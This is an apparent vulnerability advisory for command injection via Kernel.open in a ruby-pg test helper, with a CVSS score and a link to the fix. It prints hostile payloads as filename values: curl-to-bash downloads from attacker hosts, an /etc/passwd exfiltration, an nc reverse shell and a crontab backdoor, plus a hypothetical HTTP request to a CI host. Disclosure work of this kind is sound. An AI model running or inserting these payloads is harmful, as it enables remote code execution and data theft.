# 🛡️ Advisory: Command Injection in `ruby-pg` via `Kernel.open` Helper

### Summary

A **command injection vulnerability** was identified in the `dump_ssl_key` method of `spec/helpers.rb` within the [`ged/ruby-pg`](https://github.com/ged/ruby-pg) project. The method invokes `Kernel.open` with a user-controlled `name` argument, which under certain conditions (e.g., leading `|`), is interpreted as a shell command, resulting in arbitrary code execution. This flaw poses a threat particularly in CI environments, test pipelines, or local development setups where malicious inputs may be introduced.


## Details

The vulnerability lies in this method:

```ruby
# spec/helpers.rb:477-480
def dump_ssl_key( key, name )
  open( name, 'w' ) {|f| f.write key.to_pem }
  File.chmod( 0600, name )
end
```
In Ruby, using `open()` from the `Kernel` module with a string starting with `|` causes the rest of the string to be executed as a shell command. This behavior is documented and long-standing, but dangerous if not handled properly.

### Trigger

Passing a `name` such as:

```ruby
"| curl http://attacker.com/malware.sh | bash"
```

would result in command execution under the current Ruby process.


## Proof of Concept (PoC)

### Code

```ruby
require './spec/helpers'

key = OpenSSL::PKey::RSA.new(2048)
filename = "| echo pwned > /tmp/poc"

dump_ssl_key(key, filename)

puts File.read("/tmp/poc")
```

### Execution

```bash
bundle exec ruby poc.rb
```

✅ Output:

```
pwned
```

## BurpSuite HTTP Request

> Catatan: Karena ini dieksekusi dalam konteks lokal, request HTTP hanya relevan jika PoC disisipkan sebagai bagian dari payload terhadap API (misal test runner berbasis HTTP):

```
POST /test-run HTTP/1.1
Host: ci.ruby-pg.org
Content-Type: application/json

{
  "filename": "| curl http://attacker.site/malware.sh | bash",
  "key": "-----BEGIN RSA PRIVATE KEY-----..."
}
```

## Vulnerable Code 

* 📄 File: [`spec/helpers.rb`](https://github.com/ged/ruby-pg/blob/dae9173a10a194c6bfd1a5eb6bcb98637cfbf4b5/spec/helpers.rb#L477)
* 🧨 Line: 477
* 🔥 Vulnerable Call:

  ```ruby
  open(name, 'w') {|f| f.write key.to_pem }
  ```

## Vulnerable Exploit Variants

* **Exfiltration**

  ```ruby
  dump_ssl_key(key, "| curl -d @/etc/passwd http://attacker.site/exfil")
  ```
* **Reverse Shell**

  ```ruby
  dump_ssl_key(key, "| nc attacker.com 4444 -e /bin/sh")
  ```
* **Privilege Persistence**

  ```ruby
  dump_ssl_key(key, "| echo '* * * * * /tmp/backdoor.sh' | crontab -")
  ```

---


### 📊 CVE / CVSS Score

* **CWE**: [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
* **CVSS v3.1**: 8.1 (High)

  * **Vector**: `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`
  * Attack complexity is high due to the test-only context, but impact is complete compromise in vulnerable environments.


## Impact
This vulnerability can be exploited by injecting malicious filenames into test helpers, especially in scenarios such as:

* **CI/CD pipelines**: Poisoning test steps with remote shell payloads
* **Developer environments**: Code execution on test run
* **Package builds**: RCE during gem packaging or release

Attackers exploiting this flaw may gain arbitrary code execution under the context of the Ruby process, which often includes access to local secrets, tokens, SSH keys, and source code.


## References

* [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
* [Ruby Kernel.open Docs](https://ruby-doc.org/core-2.7.0/Kernel.html#method-i-open)
* [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
* [GitHub PR with Fix](https://github.com/ged/ruby-pg/pull/665)
